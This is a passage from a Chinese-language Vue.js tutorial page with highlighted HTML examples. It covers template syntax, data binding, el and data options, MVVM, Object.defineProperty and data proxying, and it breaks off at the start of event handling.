class="comment">6.&#123;&#123;xxx&#125;&#125;中xxx要写js表达式，且xxx可以读取到data中的所有属性；</span></span><br><span class="line"><span class="comment">7.一旦data中的数据发生变化，那么模板中用到该数据的地方也会自动更新；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//创建一个Vue实例</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,<span class="comment">//选择关联id为root的容器，并为其创建Vue实例</span></span></span><br><span class="line"><span class="javascript">data:&#123;<span class="comment">//data中存储数据，数据供el指定的容器使用</span></span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;张三01&#x27;</span>,</span></span><br><span class="line">age:18</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-vue模板语法"><a href="#2-vue模板语法" class="headerlink" title="2.vue模板语法"></a>2.vue模板语法</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>vue模板语法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">vue模板语法有两大类：</span></span><br><span class="line"><span class="comment">1.插值语法：</span></span><br><span class="line"><span class="comment">功能：用于解析标签体内容；</span></span><br><span class="line"><span class="comment">写法：&#123;&#123;xxx&#125;&#125;，xxx为js表达式，且可以直接读取到data里的所有属性；</span></span><br><span class="line"><span class="comment">2.指令语法：</span></span><br><span class="line"><span class="comment">功能：用于标签（包括：标签属性、标签体内容、绑定事件······）；</span></span><br><span class="line"><span class="comment">写法：v-bind:href=&quot;xxx&quot; 或简写为 :href=&quot;xxx&quot;，xxx同样为js表达式，且可以直接读取到data里的所有属性；</span></span><br><span class="line"><span class="comment">备注：Vue中有很多的Vue指令，且形式都是v-????，此处只是拿v-bind举例；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>插值语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>指令语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&#x27;v-bind:&#x27;绑定数据，可以将标签里的属性的值和Vue实例里的data里的属性绑定,&#x27;v-bind:&#x27;可以简写为&#x27;:&#x27;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>点我去百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>点我去百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span>,</span></span><br><span class="line"><span class="javascript">url:<span class="string">&#x27;https://www.baidu.com&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-vue的数据绑定"><a href="#3-vue的数据绑定" class="headerlink" title="3.vue的数据绑定"></a>3.vue的数据绑定</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>vue的数据绑定<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中数据有两种绑定方式：</span></span><br><span class="line"><span class="comment">1.单向绑定（v-bind）：数据只能从data流向页面</span></span><br><span class="line"><span class="comment">2.双向绑定（v-model）：数据不仅能从data流向页面，还能从页面流向data。</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">1.双向绑定一般应用在表单类元素上（列如：input、select等）。</span></span><br><span class="line"><span class="comment">2.v-model:value可以简写为v-model，因为v-model默认就是收集的value的值。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--普通写法--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;/&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="comment">双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--简写--&gt;</span></span><br><span class="line">单向数据绑定：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;name&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">双向数据绑定：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--错误代码，因为v-model只能应用在表单类元素（输入类元素）上--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-model:x=&quot;name&quot;&gt;你好啊&lt;/h2&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span>,</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-el和data的两种写法"><a href="#4-el和data的两种写法" class="headerlink" title="4.el和data的两种写法"></a>4.el和data的两种写法</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>el和data的两种写法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">el和data的两种写法：</span></span><br><span class="line"><span class="comment">1.el有两种写法：</span></span><br><span class="line"><span class="comment">（1）new Vue时候配置el属性；</span></span><br><span class="line"><span class="comment">（2）先创建Vue实例，然后再通过v.$mount(&#x27;#root&#x27;)指定el的值；</span></span><br><span class="line"><span class="comment">2.data有两种写法：</span></span><br><span class="line"><span class="comment">（1）对象式</span></span><br><span class="line"><span class="comment">（2）函数式</span></span><br><span class="line"><span class="comment">如何选择：目前使用哪种都可以，以后学习到Vue组件时，data必须使用函数式，否则会报错；</span></span><br><span class="line"><span class="comment">3.一个重要的原则：</span></span><br><span class="line"><span class="comment">由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不是Vue实例；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//el的两种写法：</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//const v = new Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">////el的第一种写法</span></span></span><br><span class="line"><span class="javascript"><span class="comment">////el:&#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//data:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//name:&#x27;jack&#x27;,</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(v)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">////el的第二种写法，比较灵活</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//v.$mount(&#x27;#root&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//延迟1秒绑定容器</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//setTimeout(()=&gt;&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//v.$mount(&#x27;#root&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;,1000)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//data的两种写法：</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="javascript"><span class="comment">//data的第一种写法，对象式</span></span></span><br><span class="line">/*data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span></span></span><br><span class="line">&#125;*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//data的第二种写法，函数式</span></span></span><br><span class="line"><span class="javascript">data:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;@@@&#x27;</span>,<span class="built_in">this</span>)<span class="comment">//此处的this是Vue实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//简写</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//data()&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(&#x27;@@@&#x27;,this)//此处的this是Vue实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//return&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//name:&#x27;jack01&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//错误示范，箭头函数</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//data:()=&gt;&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(&#x27;@@@&#x27;,this)//此处的this不是Vue实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//return&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//name:&#x27;jack&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-MVVM模型"><a href="#5-MVVM模型" class="headerlink" title="5.MVVM模型"></a>5.MVVM模型</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>MVVM模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中的MVVM模型：</span></span><br><span class="line"><span class="comment">1.M（模型）：data中的数据</span></span><br><span class="line"><span class="comment">2.V（视图）：模板代码</span></span><br><span class="line"><span class="comment">3.VM（视图模型ViewModel）：Vue实例</span></span><br><span class="line"><span class="comment">观察发现：</span></span><br><span class="line"><span class="comment">1.data中的所有属性，最后都出现在了vm身上；</span></span><br><span class="line"><span class="comment">2.vm身上的所有属性，及Vue原型上的所有属性，在Vue模板中都可以直接使用；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;清华大学&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-回顾Object-defineproperty方法"><a href="#6-回顾Object-defineproperty方法" class="headerlink" title="6.回顾Object.defineproperty方法"></a>6.回顾Object.defineproperty方法</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>回顾Object.defineproperty方法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--数据代理：通过一个对象对另一个对象中的属性进行操作（读/写）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> number = <span class="number">19</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> person = &#123;</span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="javascript">sex:<span class="string">&#x27;男&#x27;</span>,</span></span><br><span class="line"><span class="javascript"><span class="comment">//age:18</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//往person对象添加age属性，并为属性赋值</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(person,<span class="string">&#x27;age&#x27;</span>,&#123;</span></span><br><span class="line">/*</span><br><span class="line">value:18,</span><br><span class="line"><span class="javascript">enumerable:<span class="literal">true</span>,<span class="comment">//控制属性是否可以枚举，默认是false</span></span></span><br><span class="line"><span class="javascript">writable:<span class="literal">true</span>,<span class="comment">//控制属性是否可以修改，默认是false</span></span></span><br><span class="line"><span class="javascript">configurable:<span class="literal">true</span><span class="comment">//控制属性是否可以删除，默认是false</span></span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//当有人读取person的age属性时，就会调用get函数，返回值就是age的值。</span></span></span><br><span class="line"><span class="javascript">get:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;有人读取person的age属性&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> number</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//当有人设置person的age属性时，就会调用get函数，返回值就是age的值。</span></span></span><br><span class="line"><span class="javascript">set:<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;有人设置person的age属性&#x27;</span>,value)</span></span><br><span class="line">number = value</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(person)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-Vue中的数据代理"><a href="#7-Vue中的数据代理" class="headerlink" title="7.Vue中的数据代理"></a>7.Vue中的数据代理</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue中的数据代理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.Vue中的数据代理：</span></span><br><span class="line"><span class="comment">通过vm对象来代理data对象中的属性操作（读/写）；</span></span><br><span class="line"><span class="comment">2.Vue中数据代理的好处：</span></span><br><span class="line"><span class="comment">更加方便操作data中的数据；</span></span><br><span class="line"><span class="comment">3.基本原理：</span></span><br><span class="line"><span class="comment">通过Object.defineproperty()把data对象中的所以有属性添加到vm身上;</span></span><br><span class="line"><span class="comment">为每一个添加到vm上的属性，都生成一个getter/setter;</span></span><br><span class="line"><span class="comment">在getter/setter内部去操作data中对应的属性;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;清华大学&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-Vue事件处理"><a href="#8-Vue事件处理" class="headerlink" title="8.Vue事件处理"></a>8.Vue事件处理</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">事件的基本使用：</span></span><br><span class="line"><span class="comment">1.使用v-on:xxx或者@xxx绑定事件，其中xxx是事件名；</span></span><br><span class="line"><span class="comment">2.事件回调需要配置在methods对象中，最终会在vm上；</span></span><br><span class="line"><span class="comment">3.methods中配置的函数，不要用箭头函数，否则this就不是vm；</span></span><br><span class="line"><span class="comment">4.methods中配置的函数，都是被Vue管理的函数，this的指向是vm 或 组件实例对象；</span></span><br><span class="line"><span class="comment">5.@click=&quot;demo&quot;和@click=&quot;demo($event)&quot;效果一致，但后者可以传参；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--普通写法--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;--&gt;</span></span><br><span class="line"><span 